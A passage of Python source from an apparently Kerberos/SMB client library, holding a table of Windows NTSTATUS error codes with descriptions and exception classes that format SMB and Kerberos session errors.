		0xC01E0507: ("STATUS_GRAPHICS_PVP_DISPLAY_DEVICE_NOT_ATTACHED_TO_DESKTOP","This function failed because the GDI display device passed to it was not attached to the Windows desktop."),
		0xC01E0508: ("STATUS_GRAPHICS_PVP_MIRRORING_DEVICES_NOT_SUPPORTED","The PVP does not support mirroring display devices because they do not have any protected outputs."),
		0xC01E050A: ("STATUS_GRAPHICS_OPM_INVALID_POINTER","The function failed because an invalid pointer parameter was passed to it. A pointer parameter is invalid if it is null, is not correctly aligned, or it points to an invalid address or a kernel mode address."),
		0xC01E050B: ("STATUS_GRAPHICS_OPM_INTERNAL_ERROR","An internal error caused an operation to fail."),
		0xC01E050C: ("STATUS_GRAPHICS_OPM_INVALID_HANDLE","The function failed because the caller passed in an invalid OPM user-mode handle."),
		0xC01E050D: ("STATUS_GRAPHICS_PVP_NO_MONITORS_CORRESPOND_TO_DISPLAY_DEVICE","This function failed because the GDI device passed to it did not have any monitors associated with it."),
		0xC01E050E: ("STATUS_GRAPHICS_PVP_INVALID_CERTIFICATE_LENGTH","A certificate could not be returned because the certificate buffer passed to the function was too small."),
		0xC01E050F: ("STATUS_GRAPHICS_OPM_SPANNING_MODE_ENABLED","DxgkDdiOpmCreateProtectedOutput() could not create a protected output because the video present yarget is in spanning mode."),
		0xC01E0510: ("STATUS_GRAPHICS_OPM_THEATER_MODE_ENABLED","DxgkDdiOpmCreateProtectedOutput() could not create a protected output because the video present target is in theater mode."),
		0xC01E0511: ("STATUS_GRAPHICS_PVP_HFS_FAILED","The function call failed because the display adapter's hardware functionality scan (HFS) failed to validate the graphics hardware."),
		0xC01E0512: ("STATUS_GRAPHICS_OPM_INVALID_SRM","The HDCP SRM passed to this function did not comply with section 5 of the HDCP 1.1 specification."),
		0xC01E0513: ("STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_HDCP","The protected output cannot enable the HDCP system because it does not support it."),
		0xC01E0514: ("STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_ACP","The protected output cannot enable analog copy protection because it does not support it."),
		0xC01E0515: ("STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_CGMSA","The protected output cannot enable the CGMS-A protection technology because it does not support it."),
		0xC01E0516: ("STATUS_GRAPHICS_OPM_HDCP_SRM_NEVER_SET","DxgkDdiOPMGetInformation() cannot return the version of the SRM being used because the application never successfully passed an SRM to the protected output."),
		0xC01E0517: ("STATUS_GRAPHICS_OPM_RESOLUTION_TOO_HIGH","DxgkDdiOPMConfigureProtectedOutput() cannot enable the specified output protection technology because the output's screen resolution is too high."),
		0xC01E0518: ("STATUS_GRAPHICS_OPM_ALL_HDCP_HARDWARE_ALREADY_IN_USE","DxgkDdiOPMConfigureProtectedOutput() cannot enable HDCP because other physical outputs are using the display adapter's HDCP hardware."),
		0xC01E051A: ("STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_NO_LONGER_EXISTS","The operating system asynchronously destroyed this OPM-protected output because the operating system state changed. This error typically occurs because the monitor PDO associated with this protected output was removed or stopped, the protected output's session became a nonconsole session, or the protected output's desktop became inactive."),
		0xC01E051B: ("STATUS_GRAPHICS_OPM_SESSION_TYPE_CHANGE_IN_PROGRESS","OPM functions cannot be called when a session is changing its type. Three types of sessions currently exist: console, disconnected, and remote (RDP or ICA)."),
		0xC01E051C: ("STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_DOES_NOT_HAVE_COPP_SEMANTICS","The DxgkDdiOPMGetCOPPCompatibleInformation, DxgkDdiOPMGetInformation, or DxgkDdiOPMConfigureProtectedOutput function failed. This error is returned only if a protected output has OPM semantics.  DxgkDdiOPMGetCOPPCompatibleInformation always returns this error if a protected output has OPM semantics.  DxgkDdiOPMGetInformation returns this error code if the caller requested COPP-specific information.  DxgkDdiOPMConfigureProtectedOutput returns this error when the caller tries to use a COPP-specific command."),
		0xC01E051D: ("STATUS_GRAPHICS_OPM_INVALID_INFORMATION_REQUEST","The DxgkDdiOPMGetInformation and DxgkDdiOPMGetCOPPCompatibleInformation functions return this error code if the passed-in sequence number is not the expected sequence number or the passed-in OMAC value is invalid."),
		0xC01E051E: ("STATUS_GRAPHICS_OPM_DRIVER_INTERNAL_ERROR","The function failed because an unexpected error occurred inside a display driver."),
		0xC01E051F: ("STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_DOES_NOT_HAVE_OPM_SEMANTICS","The DxgkDdiOPMGetCOPPCompatibleInformation, DxgkDdiOPMGetInformation, or DxgkDdiOPMConfigureProtectedOutput function failed. This error is returned only if a protected output has COPP semantics.  DxgkDdiOPMGetCOPPCompatibleInformation returns this error code if the caller requested OPM-specific information.  DxgkDdiOPMGetInformation always returns this error if a protected output has COPP semantics.  DxgkDdiOPMConfigureProtectedOutput returns this error when the caller tries to use an OPM-specific command."),
		0xC01E0520: ("STATUS_GRAPHICS_OPM_SIGNALING_NOT_SUPPORTED","The DxgkDdiOPMGetCOPPCompatibleInformation and DxgkDdiOPMConfigureProtectedOutput functions return this error if the display driver does not support the DXGKMDT_OPM_GET_ACP_AND_CGMSA_SIGNALING and DXGKMDT_OPM_SET_ACP_AND_CGMSA_SIGNALING GUIDs."),
		0xC01E0521: ("STATUS_GRAPHICS_OPM_INVALID_CONFIGURATION_REQUEST","The DxgkDdiOPMConfigureProtectedOutput function returns this error code if the passed-in sequence number is not the expected sequence number or the passed-in OMAC value is invalid."),
		0xC01E0580: ("STATUS_GRAPHICS_I2C_NOT_SUPPORTED","The monitor connected to the specified video output does not have an I2C bus."),
		0xC01E0581: ("STATUS_GRAPHICS_I2C_DEVICE_DOES_NOT_EXIST","No device on the I2C bus has the specified address."),
		0xC01E0582: ("STATUS_GRAPHICS_I2C_ERROR_TRANSMITTING_DATA","An error occurred while transmitting data to the device on the I2C bus."),
		0xC01E0583: ("STATUS_GRAPHICS_I2C_ERROR_RECEIVING_DATA","An error occurred while receiving data from the device on the I2C bus."),
		0xC01E0584: ("STATUS_GRAPHICS_DDCCI_VCP_NOT_SUPPORTED","The monitor does not support the specified VCP code."),
		0xC01E0585: ("STATUS_GRAPHICS_DDCCI_INVALID_DATA","The data received from the monitor is invalid."),
		0xC01E0586: ("STATUS_GRAPHICS_DDCCI_MONITOR_RETURNED_INVALID_TIMING_STATUS_BYTE","A function call failed because a monitor returned an invalid timing status byte when the operating system used the DDC/CI get timing report and timing message command to get a timing report from a monitor."),
		0xC01E0587: ("STATUS_GRAPHICS_DDCCI_INVALID_CAPABILITIES_STRING","A monitor returned a DDC/CI capabilities string that did not comply with the ACCESS.bus 3.0, DDC/CI 1.1, or MCCS 2 Revision 1 specification."),
		0xC01E0588: ("STATUS_GRAPHICS_MCA_INTERNAL_ERROR","An internal error caused an operation to fail."),
		0xC01E0589: ("STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_COMMAND","An operation failed because a DDC/CI message had an invalid value in its command field."),
		0xC01E058A: ("STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_LENGTH","This error occurred because a DDC/CI message had an invalid value in its length field."),
		0xC01E058B: ("STATUS_GRAPHICS_DDCCI_INVALID_MESSAGE_CHECKSUM","This error occurred because the value in a DDC/CI message's checksum field did not match the message's computed checksum value. This error implies that the data was corrupted while it was being transmitted from a monitor to a computer."),
		0xC01E058C: ("STATUS_GRAPHICS_INVALID_PHYSICAL_MONITOR_HANDLE","This function failed because an invalid monitor handle was passed to it."),
		0xC01E058D: ("STATUS_GRAPHICS_MONITOR_NO_LONGER_EXISTS","The operating system asynchronously destroyed the monitor that corresponds to this handle because the operating system's state changed. This error typically occurs because the monitor PDO associated with this handle was removed or stopped, or a display mode change occurred. A display mode change occurs when Windows sends a WM_DISPLAYCHANGE message to applications."),
		0xC01E05E0: ("STATUS_GRAPHICS_ONLY_CONSOLE_SESSION_SUPPORTED","This function can be used only if a program is running in the local console session. It cannot be used if a program is running on a remote desktop session or on a terminal server session."),
		0xC01E05E1: ("STATUS_GRAPHICS_NO_DISPLAY_DEVICE_CORRESPONDS_TO_NAME","This function cannot find an actual GDI display device that corresponds to the specified GDI display device name."),
		0xC01E05E2: ("STATUS_GRAPHICS_DISPLAY_DEVICE_NOT_ATTACHED_TO_DESKTOP","The function failed because the specified GDI display device was not attached to the Windows desktop."),
		0xC01E05E3: ("STATUS_GRAPHICS_MIRRORING_DEVICES_NOT_SUPPORTED","This function does not support GDI mirroring display devices because GDI mirroring display devices do not have any physical monitors associated with them."),
		0xC01E05E4: ("STATUS_GRAPHICS_INVALID_POINTER","The function failed because an invalid pointer parameter was passed to it. A pointer parameter is invalid if it is null, is not correctly aligned, or points to an invalid address or to a kernel mode address."),
		0xC01E05E5: ("STATUS_GRAPHICS_NO_MONITORS_CORRESPOND_TO_DISPLAY_DEVICE","This function failed because the GDI device passed to it did not have a monitor associated with it."),
		0xC01E05E6: ("STATUS_GRAPHICS_PARAMETER_ARRAY_TOO_SMALL","An array passed to the function cannot hold all of the data that the function must copy into the array."),
		0xC01E05E7: ("STATUS_GRAPHICS_INTERNAL_ERROR","An internal error caused an operation to fail."),
		0xC01E05E8: ("STATUS_GRAPHICS_SESSION_TYPE_CHANGE_IN_PROGRESS","The function failed because the current session is changing its type. This function cannot be called when the current session is changing its type. Three types of sessions currently exist: console, disconnected, and remote (RDP or ICA)."),
		0xC0210000: ("STATUS_FVE_LOCKED_VOLUME","The volume must be unlocked before it can be used."),
		0xC0210001: ("STATUS_FVE_NOT_ENCRYPTED","The volume is fully decrypted and no key is available."),
		0xC0210002: ("STATUS_FVE_BAD_INFORMATION","The control block for the encrypted volume is not valid."),
		0xC0210003: ("STATUS_FVE_TOO_SMALL","Not enough free space remains on the volume to allow encryption."),
		0xC0210004: ("STATUS_FVE_FAILED_WRONG_FS","The partition cannot be encrypted because the file system is not supported."),
		0xC0210005: ("STATUS_FVE_FAILED_BAD_FS","The file system is inconsistent. Run the Check Disk utility."),
		0xC0210006: ("STATUS_FVE_FS_NOT_EXTENDED","The file system does not extend to the end of the volume."),
		0xC0210007: ("STATUS_FVE_FS_MOUNTED","This operation cannot be performed while a file system is mounted on the volume."),
		0xC0210008: ("STATUS_FVE_NO_LICENSE","BitLocker Drive Encryption is not included with this version of Windows."),
		0xC0210009: ("STATUS_FVE_ACTION_NOT_ALLOWED","The requested action was denied by the FVE control engine."),
		0xC021000A: ("STATUS_FVE_BAD_DATA","The data supplied is malformed."),
		0xC021000B: ("STATUS_FVE_VOLUME_NOT_BOUND","The volume is not bound to the system."),
		0xC021000C: ("STATUS_FVE_NOT_DATA_VOLUME","The volume specified is not a data volume."),
		0xC021000D: ("STATUS_FVE_CONV_READ_ERROR","A read operation failed while converting the volume."),
		0xC021000E: ("STATUS_FVE_CONV_WRITE_ERROR","A write operation failed while converting the volume."),
		0xC021000F: ("STATUS_FVE_OVERLAPPED_UPDATE","The control block for the encrypted volume was updated by another thread. Try again."),
		0xC0210010: ("STATUS_FVE_FAILED_SECTOR_SIZE","The volume encryption algorithm cannot be used on this sector size."),
		0xC0210011: ("STATUS_FVE_FAILED_AUTHENTICATION","BitLocker recovery authentication failed."),
		0xC0210012: ("STATUS_FVE_NOT_OS_VOLUME","The volume specified is not the boot operating system volume."),
		0xC0210013: ("STATUS_FVE_KEYFILE_NOT_FOUND","The BitLocker startup key or recovery password could not be read from external media."),
		0xC0210014: ("STATUS_FVE_KEYFILE_INVALID","The BitLocker startup key or recovery password file is corrupt or invalid."),
		0xC0210015: ("STATUS_FVE_KEYFILE_NO_VMK","The BitLocker encryption key could not be obtained from the startup key or the recovery password."),
		0xC0210016: ("STATUS_FVE_TPM_DISABLED","The TPM is disabled."),
		0xC0210017: ("STATUS_FVE_TPM_SRK_AUTH_NOT_ZERO","The authorization data for the SRK of the TPM is not zero."),
		0xC0210018: ("STATUS_FVE_TPM_INVALID_PCR","The system boot information changed or the TPM locked out access to BitLocker encryption keys until the computer is restarted."),
		0xC0210019: ("STATUS_FVE_TPM_NO_VMK","The BitLocker encryption key could not be obtained from the TPM."),
		0xC021001A: ("STATUS_FVE_PIN_INVALID","The BitLocker encryption key could not be obtained from the TPM and PIN."),
		0xC021001B: ("STATUS_FVE_AUTH_INVALID_APPLICATION","A boot application hash does not match the hash computed when BitLocker was turned on."),
		0xC021001C: ("STATUS_FVE_AUTH_INVALID_CONFIG","The Boot Configuration Data (BCD) settings are not supported or have changed because BitLocker was enabled."),
		0xC021001D: ("STATUS_FVE_DEBUGGER_ENABLED","Boot debugging is enabled. Run Windows Boot Configuration Data Store Editor (bcdedit.exe) to turn it off."),
		0xC021001E: ("STATUS_FVE_DRY_RUN_FAILED","The BitLocker encryption key could not be obtained."),
		0xC021001F: ("STATUS_FVE_BAD_METADATA_POINTER","The metadata disk region pointer is incorrect."),
		0xC0210020: ("STATUS_FVE_OLD_METADATA_COPY","The backup copy of the metadata is out of date."),
		0xC0210021: ("STATUS_FVE_REBOOT_REQUIRED","No action was taken because a system restart is required."),
		0xC0210022: ("STATUS_FVE_RAW_ACCESS","No action was taken because BitLocker Drive Encryption is in RAW access mode."),
		0xC0210023: ("STATUS_FVE_RAW_BLOCKED","BitLocker Drive Encryption cannot enter RAW access mode for this volume."),
		0xC0210026: ("STATUS_FVE_NO_FEATURE_LICENSE","This feature of BitLocker Drive Encryption is not included with this version of Windows."),
		0xC0210027: ("STATUS_FVE_POLICY_USER_DISABLE_RDV_NOT_ALLOWED","Group policy does not permit turning off BitLocker Drive Encryption on roaming data volumes."),
		0xC0210028: ("STATUS_FVE_CONV_RECOVERY_FAILED","Bitlocker Drive Encryption failed to recover from aborted conversion. This could be due to either all conversion logs being corrupted or the media being write-protected."),
		0xC0210029: ("STATUS_FVE_VIRTUALIZED_SPACE_TOO_BIG","The requested virtualization size is too big."),
		0xC0210030: ("STATUS_FVE_VOLUME_TOO_SMALL","The drive is too small to be protected using BitLocker Drive Encryption."),
		0xC0220001: ("STATUS_FWP_CALLOUT_NOT_FOUND","The callout does not exist."),
		0xC0220002: ("STATUS_FWP_CONDITION_NOT_FOUND","The filter condition does not exist."),
		0xC0220003: ("STATUS_FWP_FILTER_NOT_FOUND","The filter does not exist."),
		0xC0220004: ("STATUS_FWP_LAYER_NOT_FOUND","The layer does not exist."),
		0xC0220005: ("STATUS_FWP_PROVIDER_NOT_FOUND","The provider does not exist."),
		0xC0220006: ("STATUS_FWP_PROVIDER_CONTEXT_NOT_FOUND","The provider context does not exist."),
		0xC0220007: ("STATUS_FWP_SUBLAYER_NOT_FOUND","The sublayer does not exist."),
		0xC0220008: ("STATUS_FWP_NOT_FOUND","The object does not exist."),
		0xC0220009: ("STATUS_FWP_ALREADY_EXISTS","An object with that GUID or LUID already exists."),
		0xC022000A: ("STATUS_FWP_IN_USE","The object is referenced by other objects and cannot be deleted."),
		0xC022000B: ("STATUS_FWP_DYNAMIC_SESSION_IN_PROGRESS","The call is not allowed from within a dynamic session."),
		0xC022000C: ("STATUS_FWP_WRONG_SESSION","The call was made from the wrong session and cannot be completed."),
		0xC022000D: ("STATUS_FWP_NO_TXN_IN_PROGRESS","The call must be made from within an explicit transaction."),
		0xC022000E: ("STATUS_FWP_TXN_IN_PROGRESS","The call is not allowed from within an explicit transaction."),
		0xC022000F: ("STATUS_FWP_TXN_ABORTED","The explicit transaction has been forcibly canceled."),
		0xC0220010: ("STATUS_FWP_SESSION_ABORTED","The session has been canceled."),
		0xC0220011: ("STATUS_FWP_INCOMPATIBLE_TXN","The call is not allowed from within a read-only transaction."),
		0xC0220012: ("STATUS_FWP_TIMEOUT","The call timed out while waiting to acquire the transaction lock."),
		0xC0220013: ("STATUS_FWP_NET_EVENTS_DISABLED","The collection of network diagnostic events is disabled."),
		0xC0220014: ("STATUS_FWP_INCOMPATIBLE_LAYER","The operation is not supported by the specified layer."),
		0xC0220015: ("STATUS_FWP_KM_CLIENTS_ONLY","The call is allowed for kernel-mode callers only."),
		0xC0220016: ("STATUS_FWP_LIFETIME_MISMATCH","The call tried to associate two objects with incompatible lifetimes."),
		0xC0220017: ("STATUS_FWP_BUILTIN_OBJECT","The object is built-in and cannot be deleted."),
		0xC0220018: ("STATUS_FWP_TOO_MANY_BOOTTIME_FILTERS","The maximum number of boot-time filters has been reached."),
		0xC0220018: ("STATUS_FWP_TOO_MANY_CALLOUTS","The maximum number of callouts has been reached."),
		0xC0220019: ("STATUS_FWP_NOTIFICATION_DROPPED","A notification could not be delivered because a message queue has reached maximum capacity."),
		0xC022001A: ("STATUS_FWP_TRAFFIC_MISMATCH","The traffic parameters do not match those for the security association context."),
		0xC022001B: ("STATUS_FWP_INCOMPATIBLE_SA_STATE","The call is not allowed for the current security association state."),
		0xC022001C: ("STATUS_FWP_NULL_POINTER","A required pointer is null."),
		0xC022001D: ("STATUS_FWP_INVALID_ENUMERATOR","An enumerator is not valid."),
		0xC022001E: ("STATUS_FWP_INVALID_FLAGS","The flags field contains an invalid value."),
		0xC022001F: ("STATUS_FWP_INVALID_NET_MASK","A network mask is not valid."),
		0xC0220020: ("STATUS_FWP_INVALID_RANGE","An FWP_RANGE is not valid."),
		0xC0220021: ("STATUS_FWP_INVALID_INTERVAL","The time interval is not valid."),
		0xC0220022: ("STATUS_FWP_ZERO_LENGTH_ARRAY","An array that must contain at least one element has a zero length."),
		0xC0220023: ("STATUS_FWP_NULL_DISPLAY_NAME","The displayData.name field cannot be null."),
		0xC0220024: ("STATUS_FWP_INVALID_ACTION_TYPE","The action type is not one of the allowed action types for a filter."),
		0xC0220025: ("STATUS_FWP_INVALID_WEIGHT","The filter weight is not valid."),
		0xC0220026: ("STATUS_FWP_MATCH_TYPE_MISMATCH","A filter condition contains a match type that is not compatible with the operands."),
		0xC0220027: ("STATUS_FWP_TYPE_MISMATCH","An FWP_VALUE or FWPM_CONDITION_VALUE is of the wrong type."),
		0xC0220028: ("STATUS_FWP_OUT_OF_BOUNDS","An integer value is outside the allowed range."),
		0xC0220029: ("STATUS_FWP_RESERVED","A reserved field is nonzero."),
		0xC022002A: ("STATUS_FWP_DUPLICATE_CONDITION","A filter cannot contain multiple conditions operating on a single field."),
		0xC022002B: ("STATUS_FWP_DUPLICATE_KEYMOD","A policy cannot contain the same keying module more than once."),
		0xC022002C: ("STATUS_FWP_ACTION_INCOMPATIBLE_WITH_LAYER","The action type is not compatible with the layer."),
		0xC022002D: ("STATUS_FWP_ACTION_INCOMPATIBLE_WITH_SUBLAYER","The action type is not compatible with the sublayer."),
		0xC022002E: ("STATUS_FWP_CONTEXT_INCOMPATIBLE_WITH_LAYER","The raw context or the provider context is not compatible with the layer."),
		0xC022002F: ("STATUS_FWP_CONTEXT_INCOMPATIBLE_WITH_CALLOUT","The raw context or the provider context is not compatible with the callout."),
		0xC0220030: ("STATUS_FWP_INCOMPATIBLE_AUTH_METHOD","The authentication method is not compatible with the policy type."),
		0xC0220031: ("STATUS_FWP_INCOMPATIBLE_DH_GROUP","The Diffie-Hellman group is not compatible with the policy type."),
		0xC0220032: ("STATUS_FWP_EM_NOT_SUPPORTED","An IKE policy cannot contain an Extended Mode policy."),
		0xC0220033: ("STATUS_FWP_NEVER_MATCH","The enumeration template or subscription will never match any objects."),
		0xC0220034: ("STATUS_FWP_PROVIDER_CONTEXT_MISMATCH","The provider context is of the wrong type."),
		0xC0220035: ("STATUS_FWP_INVALID_PARAMETER","The parameter is incorrect."),
		0xC0220036: ("STATUS_FWP_TOO_MANY_SUBLAYERS","The maximum number of sublayers has been reached."),
		0xC0220037: ("STATUS_FWP_CALLOUT_NOTIFICATION_FAILED","The notification function for a callout returned an error."),
		0xC0220038: ("STATUS_FWP_INCOMPATIBLE_AUTH_CONFIG","The IPsec authentication configuration is not compatible with the authentication type."),
		0xC0220039: ("STATUS_FWP_INCOMPATIBLE_CIPHER_CONFIG","The IPsec cipher configuration is not compatible with the cipher type."),
		0xC022003C: ("STATUS_FWP_DUPLICATE_AUTH_METHOD","A policy cannot contain the same auth method more than once."),
		0xC0220100: ("STATUS_FWP_TCPIP_NOT_READY","The TCP/IP stack is not ready."),
		0xC0220101: ("STATUS_FWP_INJECT_HANDLE_CLOSING","The injection handle is being closed by another thread."),
		0xC0220102: ("STATUS_FWP_INJECT_HANDLE_STALE","The injection handle is stale."),
		0xC0220103: ("STATUS_FWP_CANNOT_PEND","The classify cannot be pended."),
		0xC0230002: ("STATUS_NDIS_CLOSING","The binding to the network interface is being closed."),
		0xC0230004: ("STATUS_NDIS_BAD_VERSION","An invalid version was specified."),
		0xC0230005: ("STATUS_NDIS_BAD_CHARACTERISTICS","An invalid characteristics table was used."),
		0xC0230006: ("STATUS_NDIS_ADAPTER_NOT_FOUND","Failed to find the network interface or the network interface is not ready."),
		0xC0230007: ("STATUS_NDIS_OPEN_FAILED","Failed to open the network interface."),
		0xC0230008: ("STATUS_NDIS_DEVICE_FAILED","The network interface has encountered an internal unrecoverable failure."),
		0xC0230009: ("STATUS_NDIS_MULTICAST_FULL","The multicast list on the network interface is full."),
		0xC023000A: ("STATUS_NDIS_MULTICAST_EXISTS","An attempt was made to add a duplicate multicast address to the list."),
		0xC023000B: ("STATUS_NDIS_MULTICAST_NOT_FOUND","At attempt was made to remove a multicast address that was never added."),
		0xC023000C: ("STATUS_NDIS_REQUEST_ABORTED","The network interface aborted the request."),
		0xC023000D: ("STATUS_NDIS_RESET_IN_PROGRESS","The network interface cannot process the request because it is being reset."),
		0xC023000F: ("STATUS_NDIS_INVALID_PACKET","An attempt was made to send an invalid packet on a network interface."),
		0xC0230010: ("STATUS_NDIS_INVALID_DEVICE_REQUEST","The specified request is not a valid operation for the target device."),
		0xC0230011: ("STATUS_NDIS_ADAPTER_NOT_READY","The network interface is not ready to complete this operation."),
		0xC0230014: ("STATUS_NDIS_INVALID_LENGTH","The length of the buffer submitted for this operation is not valid."),
		0xC0230015: ("STATUS_NDIS_INVALID_DATA","The data used for this operation is not valid."),
		0xC0230016: ("STATUS_NDIS_BUFFER_TOO_SHORT","The length of the submitted buffer for this operation is too small."),
		0xC0230017: ("STATUS_NDIS_INVALID_OID","The network interface does not support this object identifier."),
		0xC0230018: ("STATUS_NDIS_ADAPTER_REMOVED","The network interface has been removed."),
		0xC0230019: ("STATUS_NDIS_UNSUPPORTED_MEDIA","The network interface does not support this media type."),
		0xC023001A: ("STATUS_NDIS_GROUP_ADDRESS_IN_USE","An attempt was made to remove a token ring group address that is in use by other components."),
		0xC023001B: ("STATUS_NDIS_FILE_NOT_FOUND","An attempt was made to map a file that cannot be found."),
		0xC023001C: ("STATUS_NDIS_ERROR_READING_FILE","An error occurred while NDIS tried to map the file."),
		0xC023001D: ("STATUS_NDIS_ALREADY_MAPPED","An attempt was made to map a file that is already mapped."),
		0xC023001E: ("STATUS_NDIS_RESOURCE_CONFLICT","An attempt to allocate a hardware resource failed because the resource is used by another component."),
		0xC023001F: ("STATUS_NDIS_MEDIA_DISCONNECTED","The I/O operation failed because the network media is disconnected or the wireless access point is out of range."),
		0xC0230022: ("STATUS_NDIS_INVALID_ADDRESS","The network address used in the request is invalid."),
		0xC023002A: ("STATUS_NDIS_PAUSED","The offload operation on the network interface has been paused."),
		0xC023002B: ("STATUS_NDIS_INTERFACE_NOT_FOUND","The network interface was not found."),
		0xC023002C: ("STATUS_NDIS_UNSUPPORTED_REVISION","The revision number specified in the structure is not supported."),
		0xC023002D: ("STATUS_NDIS_INVALID_PORT","The specified port does not exist on this network interface."),
		0xC023002E: ("STATUS_NDIS_INVALID_PORT_STATE","The current state of the specified port on this network interface does not support the requested operation."),
		0xC023002F: ("STATUS_NDIS_LOW_POWER_STATE","The miniport adapter is in a lower power state."),
		0xC02300BB: ("STATUS_NDIS_NOT_SUPPORTED","The network interface does not support this request."),
		0xC023100F: ("STATUS_NDIS_OFFLOAD_POLICY","The TCP connection is not offloadable because of a local policy setting."),
		0xC0231012: ("STATUS_NDIS_OFFLOAD_CONNECTION_REJECTED","The TCP connection is not offloadable by the Chimney offload target."),
		0xC0231013: ("STATUS_NDIS_OFFLOAD_PATH_REJECTED","The IP Path object is not in an offloadable state."),
		0xC0232000: ("STATUS_NDIS_DOT11_AUTO_CONFIG_ENABLED","The wireless LAN interface is in auto-configuration mode and does not support the requested parameter change operation."),
		0xC0232001: ("STATUS_NDIS_DOT11_MEDIA_IN_USE","The wireless LAN interface is busy and cannot perform the requested operation."),
		0xC0232002: ("STATUS_NDIS_DOT11_POWER_STATE_INVALID","The wireless LAN interface is power down and does not support the requested operation."),
		0xC0232003: ("STATUS_NDIS_PM_WOL_PATTERN_LIST_FULL","The list of wake on LAN patterns is full."),
		0xC0232004: ("STATUS_NDIS_PM_PROTOCOL_OFFLOAD_LIST_FULL","The list of low power protocol offloads is full."),
		0xC0360001: ("STATUS_IPSEC_BAD_SPI","The SPI in the packet does not match a valid IPsec SA."),
		0xC0360002: ("STATUS_IPSEC_SA_LIFETIME_EXPIRED","The packet was received on an IPsec SA whose lifetime has expired."),
		0xC0360003: ("STATUS_IPSEC_WRONG_SA","The packet was received on an IPsec SA that does not match the packet characteristics."),
		0xC0360004: ("STATUS_IPSEC_REPLAY_CHECK_FAILED","The packet sequence number replay check failed."),
		0xC0360005: ("STATUS_IPSEC_INVALID_PACKET","The IPsec header and/or trailer in the packet is invalid."),
		0xC0360006: ("STATUS_IPSEC_INTEGRITY_CHECK_FAILED","The IPsec integrity check failed."),
		0xC0360007: ("STATUS_IPSEC_CLEAR_TEXT_DROP","IPsec dropped a clear text packet."),
		0xC0360008: ("STATUS_IPSEC_AUTH_FIREWALL_DROP","IPsec dropped an incoming ESP packet in authenticated firewall mode. This drop is benign."),
		0xC0360009: ("STATUS_IPSEC_THROTTLE_DROP","IPsec dropped a packet due to DOS throttle."),
		0xC0368000: ("STATUS_IPSEC_DOSP_BLOCK","IPsec Dos Protection matched an explicit block rule."),
		0xC0368001: ("STATUS_IPSEC_DOSP_RECEIVED_MULTICAST","IPsec Dos Protection received an IPsec specific multicast packet which is not allowed."),
		0xC0368002: ("STATUS_IPSEC_DOSP_INVALID_PACKET","IPsec Dos Protection received an incorrectly formatted packet."),
		0xC0368003: ("STATUS_IPSEC_DOSP_STATE_LOOKUP_FAILED","IPsec Dos Protection failed to lookup state."),
		0xC0368004: ("STATUS_IPSEC_DOSP_MAX_ENTRIES","IPsec Dos Protection failed to create state because there are already maximum number of entries allowed by policy."),
		0xC0368005: ("STATUS_IPSEC_DOSP_KEYMOD_NOT_ALLOWED","IPsec Dos Protection received an IPsec negotiation packet for a keying module which is not allowed by policy."),
		0xC0368006: ("STATUS_IPSEC_DOSP_MAX_PER_IP_RATELIMIT_QUEUES","IPsec Dos Protection failed to create per internal IP ratelimit queue because there is already maximum number of queues allowed by policy."),
		0xC038005B: ("STATUS_VOLMGR_MIRROR_NOT_SUPPORTED","The system does not support mirrored volumes."),
		0xC038005C: ("STATUS_VOLMGR_RAID5_NOT_SUPPORTED","The system does not support RAID-5 volumes."),
		0xC03A0014: ("STATUS_VIRTDISK_PROVIDER_NOT_FOUND","A virtual disk support provider for the specified file was not found."),
		0xC03A0015: ("STATUS_VIRTDISK_NOT_VIRTUAL_DISK","The specified disk is not a virtual disk."),
		0xC03A0016: ("STATUS_VHD_PARENT_VHD_ACCESS_DENIED","The chain of virtual hard disks is inaccessible. The process has not been granted access rights to the parent virtual hard disk for the differencing disk."),
		0xC03A0017: ("STATUS_VHD_CHILD_PARENT_SIZE_MISMATCH","The chain of virtual hard disks is corrupted. There is a mismatch in the virtual sizes of the parent virtual hard disk and differencing disk."),
		0xC03A0018: ("STATUS_VHD_DIFFERENCING_CHAIN_CYCLE_DETECTED","The chain of virtual hard disks is corrupted. A differencing disk is indicated in its own parent chain."),
		0xC03A0019: ("STATUS_VHD_DIFFERENCING_CHAIN_ERROR_IN_PARENT","The chain of virtual hard disks is inaccessible. There was an error opening a virtual hard disk further up the chain."),
}

class KERB_ERROR_DATA(univ.Sequence):
	componentType = namedtype.NamedTypes(
		_sequence_component('data-type', 1, Int32()),
		_sequence_component('data-value', 2, univ.OctetString()))

class SessionError(Exception):
	"""
	This is the exception every client should catch regardless of the underlying
	SMB version used. We'll take care of that. NETBIOS exceptions are NOT included,
	since all SMB versions share the same NETBIOS instances.
	"""
	def __init__( self, error = 0, packet=0):
		Exception.__init__(self)
		self.error = error
		self.packet = packet

	def getErrorCode( self ):
		return self.error

	def getErrorPacket( self ):
		return self.packet

	def getErrorString( self ):
		return NT_ERROR_MESSAGES[self.error]

	def __str__( self ):
		if self.error in NT_ERROR_MESSAGES:
			return 'SMB SessionError: %s(%s)' % (NT_ERROR_MESSAGES[self.error])
		else:
			return 'SMB SessionError: 0x%x' % self.error

class KerberosError(SessionError):
	"""
	This is the exception every client should catch regardless of the underlying
	SMB version used. We'll take care of that. NETBIOS exceptions are NOT included,
	since all SMB versions share the same NETBIOS instances.
	"""
	def __init__( self, error = 0, packet = 0):
		SessionError.__init__(self)
		self.error = error
		self.packet = packet
		if packet != 0:
			self.error = self.packet['error-code']
	   
	def getErrorCode( self ):
		return self.error

	def getErrorPacket( self ):
		return self.packet

	def getErrorString( self ):
		return KRB_ERROR_MESSAGES[self.error]

	def __str__( self ):
		retString = 'Kerberos SessionError: %s(%s)' % (KRB_ERROR_MESSAGES[self.error])
		try:
			# Let's try to get the NT ERROR, if not, we quit and give the general one
			if self.error == ErrorCodes.KRB_ERR_GENERIC.value:
				eData = decoder.decode(self.packet['e-data'], asn1Spec = KERB_ERROR_DATA())[0]
				nt_error = unpack('<L', eData['data-value'].asOctets()[:4])[0]
				retString += '\nNT ERROR: %s(%s)' % (NT_ERROR_MESSAGES[nt_error])
		except:
			pass

		return retString

##############
### AS-REQ ###
##############

### PADATA: Basic authentication 1st: PA-PAC-REQUEST ###

